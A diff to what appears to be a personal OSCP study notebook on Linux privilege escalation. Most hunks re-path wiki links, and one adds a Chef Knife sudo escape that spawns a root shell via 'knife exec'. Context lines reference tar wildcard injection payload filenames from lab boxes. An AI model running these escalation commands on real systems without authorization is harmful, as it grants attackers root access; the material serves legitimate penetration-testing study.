@@ -238,7 +238,7 @@ bsdtar -xOf /var/cache/pacman/pkg/sudo-<version>-x86_64.pkg.tar.zst etc/sudoers 
 grep NOPASSWD /etc/sudoers   # should return nothing
 ```
 
-> `echo >` overwrites sudoers entirely; restore it from the original package or a verified backup. Source: Nukem (PG Practice), [[PrivEsc Linux - SUID]]
+> `echo >` overwrites sudoers entirely; restore it from the original package or a verified backup. Source: Nukem (PG Practice), [[OSCP/RUNBOOK V2/Linux - SUID Check|PrivEsc Linux - SUID]]
 
 ### Custom SUID source review: adjacent string overwrite
 
@@ -794,7 +794,7 @@ whoami                 # root
 rm /tmp/rootbash ~/privesc.sh ~/'--checkpoint=1' ~/'--checkpoint-action=exec=bash privesc.sh'
 ```
 
-> Source: Cockpit (PG Practice), [[PrivEsc Linux - Tar Wildcard]]
+> Source: Cockpit (PG Practice), [[OSCP/RUNBOOK V2/Linux - Sudo Check|PrivEsc Linux - Tar Wildcard]]
 > Reference: [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
 
 #### Tags: #TarWildcard #SudoMisconfiguration #WildcardInjection #LinuxPrivesc
@@ -843,7 +843,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 ## Related Modules
 
-- [[MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page
+- [[OSCP/MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page
 
 ## Demonstrated in box write-ups
 
@@ -897,3 +897,20 @@ done
 ```
 
 **Gotcha:** an extracted x86_64 helper cannot execute on this i686 target. Check `file` before entering the timer race.
+
+## Chef Knife `sudo` escape
+
+When `sudo -l` grants root execution of `/usr/bin/knife` without a password, inspect its version and use Knife's Ruby evaluation feature. Ruby's `exec` replaces the Knife process while retaining the root identity acquired by sudo.
+
+```bash
+sudo -l
+command -v knife
+knife --version
+sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
+id
+whoami
+```
+
+Use the exact binary path from sudoers and record the identity proof privately. The direct reference is [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/).
+
+**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
